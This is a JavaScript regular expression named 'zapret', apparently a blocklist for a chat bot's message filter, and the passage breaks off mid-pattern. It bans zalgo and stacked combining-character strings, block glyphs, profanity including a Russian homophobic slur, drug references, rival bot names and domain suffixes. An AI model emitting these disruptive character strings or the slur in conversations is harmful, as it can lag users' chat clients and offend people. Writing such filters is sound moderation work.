  var zapret = /(ᅠ|™|&#1;|أعلى||أحبك| | || |™| |&#0000;|| |™.|Ỏ͖͈̞̩͎̻̫̫̜͉̠̫͕̭̭̫̫̹̗̹͈̼̠̖͍͚̥͈̮̼͕̠̤̯̻̥̬̗̼̳̤̳̬̪̹͚̞̼̠͕̼̠̦͚̫͔̯̹͉͉̘͎͕̼̣̝͙̱̟̹̩̟̳̦̭͉̮̖̭̣̣̞̙̗̜̺̭̻̥͚͙̝̦̲̱͉͖͉̰̦͎̫̣̼͎͍̠̮͓̹̹͉̤̰̗̙͕͇͔̱͕̭͈̳̗̭͔̘̖̺̮̜̠͖̘͓̳͕̟̠̱̫̤͓͔̘̰̲͙͍͇̙͎̣̼̗̖͙̯͉̠̟͈͍͕̪͓̝̩̦̖̹̼̠̘̮͚̟͉̺̜͍͓̯̳̱̻͕̣̳͉̻̭̭̱͍̪̩̭̺͕̺̼̥̪͖|марихуана|Cuний кuт|˙̢̢̡̢̧̡̢̛̛̛̣̭̺̪̣̤̟̭͕̭̭̙͍͉͙̖͖̱̩̤̘̝̲͍͚͇̫̟͈͚̘̰̫̰̼̟̦͚̜̫͎̘̯̭̙̼̼̰̱̟̗͎̜͖͕̪͔̭̭̺̙͍̞̰̭̎͆̆̊̓͊̌̍͑̈́̊̓̌̀́͐̊̐̀͆̐̿̾́̇͌̅̐̐̎̊̽̅̏̿̋̍͑̔͒̽̋̏̋̋̋̇́̐̈͗̆̈́̌͗͐̽̈́̾̏̊͛͌͒͋̊̽̐̒͋͑͊͊̊̾̂̏̏̓̄̈͐͐̋̇͌̇̽̓͌̾͑̍̓́̈́̀̂̑̑̍̐̒̍͑̿̍͊͆͋̋̔̍̈̈̂̊̐̏͂̇̈̾̂͑̽̓̋͊̔̂̀̀͑̌͛͂̿̍̌̅̔̈́̓̓͗͛͑̏̇̐̍̌̈́̏̍̈̃̓̓̍̿̎́͌̍̈́̾̔̉́͐̓̕͘̕͘͘͜͜͠͝͝͝͠͠͝͠͝͝͠͝͝͝͝͝͝ͅ˙̵̧̡̢̨̧̧̢̨̢̨̡̡̢̧̢̧̨̨̧̢̡̡̨̡̧̡̡̨̛̛̛̛̛̛̛̪͇̥̝̼̻̗͓̤̱͖̙̭̯͙̦̭̗͚͉̜̳͎͎͇̪̭̠̖̱̣̠̟͉̯̣̮͚̙̹̠̤̞͔̩̼̻̟̻͔̹̠͚͍͕̣̹̞̲͙̠̳̟͕̣͇̭̹̮͕̯̫͚͕͕̯͔̟̺̞̟͉̥̞̗̼̭͉̩̣͖̘̣͓̣͎̖̖̥̖̳̮̦̥̹̙̲̘̰̘͈̮̞͙̘̟̯͚̲̜̰̦̯͇̥̯̭̼̥̼̯̖͈̥͎̳̯̻̦̗̖̘͍̬͍̻̠̝̭̜͇̯͔̹͉͖͕̜̳̹̹̜̹̗̺͈̻̹̲̪͚̯̙̤̤̰̞͖̳̜̫͚̖̰̺͕̮̠͇͎͕̘͉͉̟̥̩͙̖͔̟̮͓̪̯̣̼̂̿̿͆̽̾̆̋̓̂̆̀̋̓̋͐̓͌̓̏̈̔̉̀̀̈̈̾̎̓̀͋̀̈́͂̀̓͑̂̍̄̂́̈́̔͋̽́̏̀̂́̿͒͊͌̈́̓́͗͌̀̈́͗͛͌̉̏͛͋̎̂̅̇̒͋́̆̐̓̌́͑̌͗͋͐͒̾́̂̀̀̃͋͆̐̈̉̓͊̽̌͑̽̅͊͛̍̅̃̒̀͐̽͒̓͊̅̈͐̈́͆͊͒̆̋̃̂͗̓͆̾̆͂̓̿̐̄̀̀͂̉̋̚͘̚͘̚̕̕̚̕̚̚̕̚̚̚̚̕̕͜͜͜͜͜͜͜͜͜͠͝͠͝͠͠͠͝͠͝͝ͅͅͅ˙̧̡͕̰͖̰̬̩̞͔̩̞͖̤̞͍̙̥̭͎̻̭͖̳͈̦̹̣̖̞̘͕̗̖̱͍̗̩̩̳̹̹͚͙̗͙̲̪̝̫̰͇͎̤̬̼͉̤̹͓̭͈͛̈̑̌̏͒̽͐̃̅͂̓̐̌̈́̽̽̈́͗̏̅͆͂͛̍̾͑͑̌̊̄͑̎̑̈́͆̍̈͛̑̈́̀̆̄̇͋̏̏̀́̀͋̎̉̚̚͜͜͜͜͜͝͝͠˙̴̡̢̧̧̧̧̡̧̧̡̨̢̢̨̡̛̛̳̦̪̹̠̱̩̘̝̤͇̟̟̜̬̯͍͚͎͔̣͎̗̯͈̲̞͙̟̞̖͍̜̖͕͓̝̠̣͉̹̲̱̭͔̬̞̼̬̱͚̫̣͍̩̯̜͍͕͚̪̹̯͙̫̝̖͓͖̹̜̙̞̻͖̤͚̤̹̞̪͉͖͇̤̱̺̗̖̪̘̰̯̼͔̬̠̖͍̖͍̭͖̣̮̫͙̯̪̥͕̼͕͖̗̺̜̩̙̱̱͍͎̩̖͈̤̣̹̹̘̭͕̮͍̠̫̥̝̟̗̗͍̺͚̺̗͕͎͈̹̗̠̬̞̠̘̗̲͙̗͎̦̖̜̤̼̠̰͙̙̳̞̜͉͔͙̭̮̃̊̎͒̈̽̓̌͛̒͂̓͑̐̋͒͂̊͗͐̓̆͒̀̇͛́̉̌́̌̍̈́͌͌̽̉̉͒͊̀̂́̑̉̿͆̉̀̌͛̆̔͊̄̄̑̈́͗̒̀́̐̈́͑́̽͑͋̾̎̐͗̈̒̀̀̀̌̆̉̾̍̏̓̃̊̅͌̅̏̀̅͋̀̍͒̄̈́̀̎̅̊̔̆̓̋̄̽̍̀̋̈́̄̇̽͂̍̃̍͐̓̅̌̈́͂̓̈́͗̊͛̈́͊̀̾̊̿͊̑̑̑͑̽̈̿̋̏̂͒͗̆̽́͋̓͒̒̿̒͑͐̿̈́̓̉̇̚͘̕͘͘͘̚͘͜͜͜͜͝͝͝͠͝͠͝͝͠͠͝͝͝͝͠͝ͅͅͅͅͅͅ˙̢̧̢̡̧̧̧̧̢̡̡̨̛̛̛̛̛̛̞̺̺͚̻̜̗͇͇̥̞̭̯͓͍̗̝̫̥͎̭̙͔̫̜̝̱͎̦͉͚̪̘̥̖̥̙̰͙͕͚͓̹͈̤̗͈͈̪͓̙̪̗̤̱̫̯̩̹̪͙͖̱̦̞͎̺̫̣̥͇̥͖̩̰̜̞͉̞͓̥̤͕͙̥̥̳̤̞͔̟̟̯̲͉͉͍̜̗͎̦̱̯̺̤̟̱̹̫̖̹̜̠̳̦̹̺̜̥̬̹̭̯̬͍̥͙̠̙̥̭͔̻̩̫̹̦͍̺̫̤̪̜̙̠̞͇̖̣̼͙̳̫̮͈͈̦͈̭̱̺̺͚̰̻̤̭͈̯̮̙̦̖̠̜͇̪̙̭͉̝̹̲͍̟̫͖̰̻͕͙͓̲̾̑́̍̓̃̅̇͛̂̌̀̀̂͗̊͋͗̾̿̅͗̅̒́̓̾͆̍̽͐̾̉͊̋͗̽̒̐͗̀̾͑́̃̓̀́̊̄̿̓͐̅̇̐͒́̋̈́̀̄͌̐̋̃͋̐͌̒̓͗͛̏̓͐̒͌̓̓̊̈́̈̅̈́͗͒̊̇̀͂̅̿̄̍̾̆̄̇̇̋̾̾̂̅̉̎̈́̇́̍̅͑͌̃̀̈̈́̿͗̏̈́̃̌̄̈́̈́͐͊͌́̑̊̀͆̅͂͊͆͌̎͋͑́̌́̏̿̽̈̈́͆͑̋̈́̂̂̏̿̀̇͗́́̿̂̅͛͗͋͐͑͗͌͐̏̐̓̆̽͑̆̿̉͑͆̒͘̚͘͘̚̕̕̚͘͜͜͜͜͜͝͝͝͠͝͝͝͝͠͝͠͝ͅͅͅͅͅͅͅͅ˙̢̡̨̨̨̧̡̢̡̡̧̧̡̡̢̛̛̛̛̛͚̙̭͇͍̫̪̬͚͚͖͔͇͕̼̩͍̦̫͚̭̞̦̮̮̥͙̱̥͉̗̬͕̜̟̭̜̳̞̙̻͕̪̥͓̗̟̳̲̠͇̱̫͉͚̮̺̝͓̝͓͕̼͖̻̲̹̠̼̤̹̺͍̭̯̼̝̖̩͕̜̼̬̠̭͓̙̼̙͓̼̘̠̖̝̦͙̝͓̣̥͍̗̻͍̦̪͍̘͉̤͚̮͚̺̗̖̘̻̬̭̟̫̹̞͍͚̦̝̠͖̦̹̲͔͉͓͙̺͇̮͖̝̤̮̭͖͚͎̖̫̫̦̙̺͖̩͖̦͉̭̤̪̦͍̭̥͔̮͙̝̥̬̠̣̺̖̰͈̻̹͚͙̠̗̙͙͉͔͉̖̝̠̣͚͈̱̭̖̮͉͇͙̹̝̫̝̱̦̼̤͍̣̺̮̜̦̯̅̈́͂͒̈́̌̋̇̇̅́͒̒͊̏̈́̏̋͛̓̀͒͋̈́̀̒̊͌͆̿̂͌̔̊̏̊͗͒͊̿̽̀̌̉̍̋̔̉͑͐͆̏͑̌̈́͛͗̐͒̄̍̾̒̅͌̀̏̏̃͂̎͑͑̅̑̏̓̎̋͊͋̆̿̓͘̚̚͘͘̚͜͜͜͝͠͝͠ͅͅͅͅͅͅͅ˙̵̡̢̨̡̧̧̡̢̛̱̲̰̞̞̝͎͔̳̹̣͉̠̟̰̪͍̘̜͇̲̥̖͕̹͔͍͓̯͕͔͚̳͉͙̘̺̥̦̯̞̣͚̜̘̫͚̩̪͈̻̣̗̫̳̙̠̖̠̝̫̞͔̹̫̝̰͙͕͖͓̩̤̲̟̹̥͋́́̋͊̌̎̄̓͆͗̓͛͑́̉̂̽̌͋̿͌̃̌́̄͆̉̽̀͊͛̅́̀͋̔̎͊̓̇̀͘̚͘͘̕͜͝͝ͅ°̡̛̛̛̛̥̗̹̬̠̙̗̞̲̺̦̬̠͚̺͖̗̰̝͛̈́̑͆̌̉̂̈̀̏̏̅͌͆͆͌̀͑̂̂͑̍͊͒̇̏͐̈́̇͌͂̑̌̊̅̒̌̈́͑̿̾͐̐̽̏́̈̔͗͆̀̋̏̐͋̃͒̊͊̾̋̽̉́̋̅͆̄̾̆̃͑̄́̆̇̐̃́̈́́̒͗̄̽̄̈́̇̎̊̒͗̾͐̍͂̐͋̀̊͐̇͑̽̑̀̀͆̓̍̈́̇̑̓̎͐͋̄͌̌͗̔̄̑̐̀̒̈́͆̊͆͌̓̓͛͑͒̾͆̿͂́̆̏͂̊̄̓̌̽̾̈́̓̽̋̇̌́̃̈́̍̌̋̽̓́̔̏͂̎̿̌̐̎̂̏̋̇̉̈́̕͘͘͘̚̚͘̚̕͘̚̕͘͘͘͘͘̚͝͝͝͝͝͝͝͝ͅ|˙̢̢̡̢̧̡̢̛̛̛̣̭̺̪̣̤̟̭͕̭̭̙͍͉͙̖͖̱̩̤̘̝̲͍͚͇̫̟͈͚̘̰̫̰̼̟̦͚̜̫͎̘̯̭̙̼̼̰̱̟̗͎̜͖͕̪͔̭̭̺̙͍̞̰̭̎͆̆̊̓͊̌̍͑̈́̊̓̌̀́͐̊̐̀͆̐̿̾́̇͌̅̐̐̎̊̽̅̏̿̋̍͑̔͒̽̋̏̋̋̋̇́̐̈͗̆̈́̌͗͐̽̈́̾̏̊͛͌͒͋̊̽̐̒͋͑͊͊̊̾̂̏̏̓̄̈͐͐̋̇͌̇̽̓͌̾͑̍̓́̈́̀̂̑̑̍̐̒̍͑̿̍͊͆͋̋̔̍̈̈̂̊̐̏͂̇̈̾̂͑̽̓̋͊̔̂̀̀͑̌͛͂̿̍̌̅̔̈́̓̓͗͛͑̏̇̐̍̌̈́̏̍̈̃̓̓̍̿̎́͌̍̈́̾̔̉́͐̓̕͘̕͘͘͜͜͠͝͝͝͠͠͝͠͝͝͠͝͝͝͝͝͝ͅ˙̵̧̡̢̨̧̧̢̨̢̨̡̡̢̧̢̧̨̨̧̢̡̡̨̡̧̡̡̨̛̛̛̛̛̛̛̪͇̥̝̼̻̗͓̤̱͖̙̭̯͙̦̭̗͚͉̜̳͎͎͇̪̭̠̖̱̣̠̟͉̯̣̮͚̙̹̠̤̞͔̩̼̻̟̻͔̹̠͚͍͕̣̹̞̲͙̠̳̟͕̣͇̭̹̮͕̯̫͚͕͕̯͔̟̺̞̟͉̥̞̗̼̭͉̩̣͖̘̣͓̣͎̖̖̥̖̳̮̦̥̹̙̲̘̰̘͈̮̞͙̘̟̯͚̲̜̰̦̯͇̥̯̭̼̥̼̯̖͈̥͎̳̯̻̦̗̖̘͍̬͍̻̠̝̭̜͇̯͔̹͉͖͕̜̳̹̹̜̹̗̺͈̻̹̲̪͚̯̙̤̤̰̞͖̳̜̫͚̖̰̺͕̮̠͇͎͕̘͉͉̟̥̩͙̖͔̟̮͓̪̯̣̼̂̿̿͆̽̾̆̋̓̂̆̀̋̓̋͐̓͌̓̏̈̔̉̀̀̈̈̾̎̓̀͋̀̈́͂̀̓͑̂̍̄̂́̈́̔͋̽́̏̀̂́̿͒͊͌̈́̓́͗͌̀̈́͗͛͌̉̏͛͋̎̂̅̇̒͋́̆̐̓̌́͑̌͗͋͐͒̾́̂̀̀̃͋͆̐̈̉̓͊̽̌͑̽̅͊͛̍̅̃̒̀͐̽͒̓͊̅̈͐̈́͆͊͒̆̋̃̂͗̓͆̾̆͂̓̿̐̄̀̀͂̉̋̚͘̚͘̚̕̕̚̕̚̚̕̚̚̚̚̕̕͜͜͜͜͜͜͜͜͜͠͝͠͝͠͠͠͝͠͝͝ͅͅͅ˙̧̡͕̰͖̰̬̩̞͔̩̞͖̤̞͍̙̥̭͎̻̭͖̳͈̦̹̣̖̞̘͕̗̖̱͍̗̩̩̳̹̹͚͙̗͙̲̪̝̫̰͇͎̤̬̼͉̤̹͓̭͈͛̈̑̌̏͒̽͐̃̅͂̓̐̌̈́̽̽̈́͗̏̅͆͂͛̍̾͑͑̌̊̄͑̎̑̈́͆̍̈͛̑̈́̀̆̄̇͋̏̏̀́̀͋̎̉̚̚͜͜͜͜͜͝͝͠˙̴̡̢̧̧̧̧̡̧̧̡̨̢̢̨̡̛̛̳̦̪̹̠̱̩̘̝̤͇̟̟̜̬̯͍͚͎͔̣͎̗̯͈̲̞͙̟̞̖͍̜̖͕͓̝̠̣͉̹̲̱̭͔̬̞̼̬̱͚̫̣͍̩̯̜͍͕͚̪̹̯͙̫̝̖͓͖̹̜̙̞̻͖̤͚̤̹̞̪͉͖͇̤̱̺̗̖̪̘̰̯̼͔̬̠̖͍̖͍̭͖̣̮̫͙̯̪̥͕̼͕͖̗̺̜̩̙̱̱͍͎̩̖͈̤̣̹̹̘̭͕̮͍̠̫̥̝̟̗̗͍̺͚̺̗͕͎͈̹̗̠̬̞̠̘̗̲͙̗͎̦̖̜̤̼̠̰͙̙̳̞̜͉͔͙̭̮̃̊̎͒̈̽̓̌͛̒͂̓͑̐̋͒͂̊͗͐̓̆͒̀̇͛́̉̌́̌̍̈́͌͌̽̉̉͒͊̀̂́̑̉̿͆̉̀̌͛̆̔͊̄̄̑̈́͗̒̀́̐̈́͑́̽͑͋̾̎̐͗̈̒̀̀̀̌̆̉̾̍̏̓̃̊̅͌̅̏̀̅͋̀̍͒̄̈́̀̎̅̊̔̆̓̋̄̽̍̀̋̈́̄̇̽͂̍̃̍͐̓̅̌̈́͂̓̈́͗̊͛̈́͊̀̾̊̿͊̑̑̑͑̽̈̿̋̏̂͒͗̆̽́͋̓͒̒̿̒͑͐̿̈́̓̉̇̚͘̕͘͘͘̚͘͜͜͜͜͝͝͝͠͝͠͝͝͠͠͝͝͝͝͠͝ͅͅͅͅͅͅ˙̢̧̢̡̧̧̧̧̢̡̡̨̛̛̛̛̛̛̞̺̺͚̻̜̗͇͇̥̞̭̯͓͍̗̝̫̥͎̭̙͔̫̜̝̱͎̦͉͚̪̘̥̖̥̙̰͙͕͚͓̹͈̤̗͈͈̪͓̙̪̗̤̱̫̯̩̹̪͙͖̱̦̞͎̺̫̣̥͇̥͖̩̰̜̞͉̞͓̥̤͕͙̥̥̳̤̞͔̟̟̯̲͉͉͍̜̗͎̦̱̯̺̤̟̱̹̫̖̹̜̠̳̦̹̺̜̥̬̹̭̯̬͍̥͙̠̙̥̭͔̻̩̫̹̦͍̺̫̤̪̜̙̠̞͇̖̣̼͙̳̫̮͈͈̦͈̭̱̺̺͚̰̻̤̭͈̯̮̙̦̖̠̜͇̪̙̭͉̝̹̲͍̟̫͖̰̻͕͙͓̲̾̑́̍̓̃̅̇͛̂̌̀̀̂͗̊͋͗̾̿̅͗̅̒́̓̾͆̍̽͐̾̉͊̋͗̽̒̐͗̀̾͑́̃̓̀́̊̄̿̓͐̅̇̐͒́̋̈́̀̄͌̐̋̃͋̐͌̒̓͗͛̏̓͐̒͌̓̓̊̈́̈̅̈́͗͒̊̇̀͂̅̿̄̍̾̆̄̇̇̋̾̾̂̅̉̎̈́̇́̍̅͑͌̃̀̈̈́̿͗̏̈́̃̌̄̈́̈́͐͊͌́̑̊̀͆̅͂͊͆͌̎͋͑́̌́̏̿̽̈̈́͆͑̋̈́̂̂̏̿̀̇͗́́̿̂̅͛͗͋͐͑͗͌͐̏̐̓̆̽͑̆̿̉͑͆̒͘̚͘͘̚̕̕̚͘͜͜͜͜͜͝͝͝͠͝͝͝͝͠͝͠͝ͅͅͅͅͅͅͅͅ˙̢̡̨̨̨̧̡̢̡̡̧̧̡̡̢̛̛̛̛̛͚̙̭͇͍̫̪̬͚͚͖͔͇͕̼̩͍̦̫͚̭̞̦̮̮̥͙̱̥͉̗̬͕̜̟̭̜̳̞̙̻͕̪̥͓̗̟̳̲̠͇̱̫͉͚̮̺̝͓̝͓͕̼͖̻̲̹̠̼̤̹̺͍̭̯̼̝̖̩͕̜̼̬̠̭͓̙̼̙͓̼̘̠̖̝̦͙̝͓̣̥͍̗̻͍̦̪͍̘͉̤͚̮͚̺̗̖̘̻̬̭̟̫̹̞͍͚̦̝̠͖̦̹̲͔͉͓͙̺͇̮͖̝̤̮̭͖͚͎̖̫̫̦̙̺͖̩͖̦͉̭̤̪̦͍̭̥͔̮͙̝̥̬̠̣̺̖̰͈̻̹͚͙̠̗̙͙͉͔͉̖̝̠̣͚͈̱̭̖̮͉͇͙̹̝̫̝̱̦̼̤͍̣̺̮̜̦̯̅̈́͂͒̈́̌̋̇̇̅́͒̒͊̏̈́̏̋͛̓̀͒͋̈́̀̒̊͌͆̿̂͌̔̊̏̊͗͒͊̿̽̀̌̉̍̋̔̉͑͐͆̏͑̌̈́͛͗̐͒̄̍̾̒̅͌̀̏̏̃͂̎͑͑̅̑̏̓̎̋͊͋̆̿̓͘̚̚͘͘̚͜͜͜͝͠͝͠ͅͅͅͅͅͅͅ˙̵̡̢̨̡̧̧̡̢̛̱̲̰̞̞̝͎͔̳̹̣͉̠̟̰̪͍̘̜͇̲̥̖͕̹͔͍͓̯͕͔͚̳͉͙̘̺̥̦̯̞̣͚̜̘̫͚̩̪͈̻̣̗̫̳̙̠̖̠̝̫̞͔̹̫̝̰͙͕͖͓̩̤̲̟̹̥͋́́̋͊̌̎̄̓͆͗̓͛͑́̉̂̽̌͋̿͌̃̌́̄͆̉̽̀͊͛̅́̀͋̔̎͊̓̇̀͘̚͘͘̕͜͝͝ͅ°̛͛̈́̑͆̌̉̂̈̀̏̏̅͌͆͆͌̀͑̂̂͑̍͊͒̇̏͐̈́̇͌͂̑̌̊̅̒̌̈́͑̿̾͐̐̽̏́̕͘͘͘̚̚͘͝|ส็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็|ส|█|▓|▒|56#͓͓͓͓̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏#͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏| ẖ̨̢̨̨̢̢̧̧̛̛̛̛̹̮͓͉̜͓̩͚̼͉͖̘̗͚̰͇͉͇͓̜͚͚̯̗͓͓̲̟̲͓̬͙̹̘̮͉̲̮̤̤̼͈̜̭̻͙͚̟͈̤̝̞͚̜͎͖̺̗͓͔̝͙̪̺͖̰͖̳̯̱̼͙̦͓̙̟̻͈̪̬̙̣͇̞͇̻̺͛̒̏͒̈́̊̏̔̅̾̅́̅̆͂́͋̍̈́̑̇̿̈́́̾̔̅͐͆͆͊̊̌̋̾̏͋͌̅̆́́̇̀́̇̈́̽̾̿̋͛̈̇̋̋̄̾͊̋̈́̀̃̈́̂̅͛́́̅́͊͆́̅̀̄͗̒͂̔͊͒̌̄̕͘̚̕̚̕͜͜͝͝͝͝͝ͅͅé̴̢̢̢̧̡̧̡̢̡̧̡̡̡̨̛̛̛̥̟̹͖̲̙̪̙̠̙͍̹̦̦͇̣̯͓̯͈͔̺̺̯͚̱͔̻̖̰̖̙̟͇̘͍͉̱̟͓̞͓̘͓̟̳͕̲̞̫̱̖̗̘͇̯͎̝̹̥̲͍̥͉̳̠̥͕̗͔̟͖͇͖͓̭͖̜̱̠̳̺͚̖̿͒̾̑̌̆̀̎͋̀̈́̓̓̄̂́̃̀̈́̋̎̎͌̈́̓̃̈́̐̾̀̃̎́̈͛̽̔͊͐́͌̿̐̍̈̔̒̽̿͐̅́́̊̿̉̑̑͒̔́̓̄͊̀̋̓͛̇̍̇̈́͐͑̇̌̓̓͂̎̅͘̚̚̕͘̕̚͜͝͝͠͠͝͠͠͠ͅ.̨̡̢̢̧̧̨̨̧̢̧̛͙̟̮̩̥̻̬̱̝͔̝̼̗͖͎̪̲͓͔̝̤͖̫̳̟̪͎̳̭̞̝̣̗̝̱̱̮̠̙̟̙͖̤͔͇̩͍͙̰̭̝̫̜̺̝͓̻̱̤̲͉͙̦͕̰̣̬̣̺̖̘̘̮͈̭̫͍̻̰͍̼̤̙̩͖͇̒̌͆̔̄̔̓̏͛̉͛̈́̑̑̎̈́̑͂̾͑͆̑͂͂́̋͂̄̂̒̃̆̓̐̉̀̾̽͒̎̓͐͆͑̊̉͋͋̀̈́̓̎͛̌͌̂̽̔͆̍̊̓̽̂̆̀̿̀̋̍̃̔̉̇̎̋̈́͆̈́̚͘̚̕̚͘̕͘̚̚͘̚͝͝͠͠͝͝͝ͅͅͅ|h̛̛͛̒̏͒̈́̊̏̔̅̾̅́̅̆͂́͋̍̈́̑̇̿̈́́̾̔̅͐͆͆͊̊̌̋̾̏͋͌̅̆́́̇̀́̇̈́̽̾̿̋͛̈̇̋̋̄̾͊̋̈́̀̃̈́̂̅͛́́̅́͊͆́̕͘̚̕̚͝͝͝͝͝|░|é̴̢̢̢̧̡̧̡̢̡̧̡̡̡̨̛̛̛̥̟̹͖̲̙̪̙̠̙͍̹̦̦͇̣̯͓̯͈͔̺̺̯͚̱͔̻̖̰̖̙̟͇̘͍͉̱̟͓̞͓̘͓̟̳͕̲̞̫̱̖̗̘͇̯͎̝̹̥̲͍̥͉̳̠̥͕̗͔̟͖͇͖͓̭͖̜̱̠̳̺͚̖̿͒̾̑̌̆̀̎͋̀̈́̓̓̄̂́̃̀̈́̋̎̎͌̈́̓̃̈́̐̾̀̃̎́̈͛̽̔͊͐́͌̿̐̍̈̔̒̽̿͐̅́́̊̿̉̑̑͒̔́̓̄͊̀̋̓͛̇̍̇̈́͐͑̇̌̓̓͂̎̅͘̚̚̕͘̕̚͜͝͝͠͠͝͠͠͠ͅ.̨̡̢̢̧̧̨̨̧̢̧̛͙̟̮̩̥̻̬̱̝͔̝̼̗͖͎̪̲͓͔̝̤͖̫̳̟̪͎̳̭̞̝̣̗̝̱̱̮̠̙̟̙͖̤͔͇̩͍͙̰̭̝̫̜̺̝͓̻̱̤̲͉͙̦͕̰̣̬̣̺̖̘̘̮͈̭̫͍̻̰͍̼̤̙̩͖͇̒̌͆̔̄̔̓̏͛̉͛̈́̑̑̎̈́̑͂̾͑͆̑͂͂́̋͂̄̂̒̃̆̓̐̉̀̾̽͒̎̓͐͆͑̊̉͋͋̀̈́̓̎͛̌͌̂̽̔͆̍̊̓̽̂̆̀̿̀̋̍̃̔̉̇̎̋̈́͆̈́̚͘̚̕̚͘̕͘̚̚͘̚͝͝͠͠͝͝͝ͅͅͅ|̨̡̢̢̧̧̨̨̧̢̧̛͙̟̮̩̥̻̬̱̝͔̝̼̗͖͎̪̲͓͔̝̤͖̫̳̟̪͎̳̭̞̝̣̗̝̱̱̮̠̙̟̙͖̤͔͇̩͍͙̰̭̝̫̜̺̝͓̻̱̤̲͉͙̦͕̰̣̬̣̺̖̘̘̮͈̭̫͍̻̰͍̼̤̙̩͖͇̒̌͆̔̄̔̓̏͛̉͛̈́̑̑̎̈́̑͂̾͑͆̑͂͂́̋͂̄̂̒̃̆̓̐̉̀̾̽͒̎̓͐͆͑̊̉͋͋̀̈́̓̎͛̌͌̂̽̔͆̍̊̓̽̂̆̀̿̀̋̍̃̔̉̇̎̋̈́͆̈́̚͘̚̕̚͘̕͘̚̚͘̚͝͝͠͠͝͝͝ͅͅͅ|̢̢̢̧̡̧̡̢̡̧̡̡̡̨̛̥̟̹͖̲̙̪̙̠̙͍̹̦̦͇̣̯͓̯͈͔̺̺̯͚̱͔̻̖̰̖̙̟͇̘͍͉̱̟͓̞͓̘͓̟̳͕̲̞̫̱̖̗̘͇̯͎̝̹̥̲͍̥͉̳̠̥͕̗͔̟͖͇͖͓̭͖̜̱̠̳̺͚̖̒̽̿͐̅́́̊̿̉̑̑͒̔́̓̄͊̀̋̓͛̇̍̇̈́͐͑̇̌̓̓͂̎̅̕͘̕̚͜͠͠ͅ.|разбуди в 4:20|#|подкладки|̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏56#͓͓͓͓̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏#͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏|56#͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏&|сованикогданеспит|с о в а н е с п и т|сованикогданеспит|сова не спит никогда|красная сова|вк бо т |вкботру|сова никогда|сова спит|vkbot&#4448;ru|vkvot ru|vkbotru|vkbot|v k b o t . r u|в к бот|botvk|ботвк|vkbot|bot vk|пидр|трах|насилие|.com|.ru|.pw|.pro|.net|.co|.art|.website|vkmix|сова не 